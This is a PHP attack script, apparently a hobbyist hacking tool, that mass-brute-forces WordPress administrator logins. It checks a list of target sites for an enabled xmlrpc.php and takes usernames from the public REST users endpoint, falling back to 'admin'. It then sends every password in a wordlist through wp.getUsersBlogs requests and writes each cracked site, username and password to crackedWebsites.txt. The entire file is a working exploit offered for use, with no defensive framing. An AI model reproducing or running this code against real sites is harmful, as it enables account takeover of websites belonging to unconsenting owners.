<?php

//coded by huseyinstif
//1337
//huseyintintas.com
//twitter.com/1337stif

//usage php 1337.php

include "functions.php";

$red = "\e[31m";
$yellow = "\e[33m";
$green = "\e[32m";

$T = "target.txt"; //Get targetList
// $U = "user.txt"; //Get userList
$P = "pass.txt"; //Get passList

$targetList = file($T, FILE_IGNORE_NEW_LINES);
// $userList = file($U, FILE_IGNORE_NEW_LINES);
$passList = file($P, FILE_IGNORE_NEW_LINES);


$isXmlRpcEnabled = array();


foreach($targetList as $target){
     flush();
     ob_get_contents();
     echo $yellow."CHECKING TARGET ==> " . $target . "/xmlrpc.php" . "\n";
     $req = getSite($target . "/xmlrpc.php");
     if(str_contains($req,"XML-RPC")) {
          echo $green."XML-RPC IS ON ==> " . $target . "/xmlrpc.php" . "\n";
          array_push($isXmlRpcEnabled,$target);
     } else {
          echo $red."XML-RPC IS OFF ==> " . $target . "/xmlrpc.php" . "\n";
     }     
}


function xml($user,$pw){
     $xml="
       <methodCall>
               <methodName>wp.getUsersBlogs</methodName>
               <params>
               <param><value><string>$user</string></value></param>
               <param><value><string>$pw</string></value></param>
          </params></methodCall>";
    return $xml;
}

function getUsername($target) {
     $target = $target . "/wp-json/wp/v2/users/?per_page=100&page=1";
     $req = getSite($target);
     $req = json_decode($req,true);
     $username = $req[0]['slug'];
     return $username;
}


$crackedSites = array();

foreach($isXmlRpcEnabled as $target) {
     error_reporting(0);
     $username = "";
     $username = getUsername($target);

     if(!$username) {
          $username = "admin";
     }

     foreach($passList as $password) {
          
          $req = curl($target . "/xmlrpc.php",xml($username,$password));
     
          $isAdmin = "<name>isAdmin</name><value><boolean>1</boolean>";
     
          if(str_contains($req,$isAdmin)) {
               echo $yellow."====================================== \n";
               echo $green.$target . "/xmlrpc.php" . "  ==> PASSWORD FOUND \n";
               echo $green.$username . "\n";
               echo $green.$password . "\n";
               echo $yellow."====================================== \n";
               array_push($crackedSites,$target,$username,$password);
          }else {
               echo $yellow."====================================== \n";
               echo $red.$target ."  ==> $password PASSWORD NOT FOUND \n";
               echo $yellow."====================================== \n";
          }
     }
}

echo $yellow."====================================== \n";
echo $green. count($crackedSites) / 3 . " sites cracked. \n";
echo $green. "crackedWebsites.txt is writed. \n";
echo $yellow."====================================== \n";

file_put_contents("crackedWebsites.txt",print_r($crackedSites,true));







?>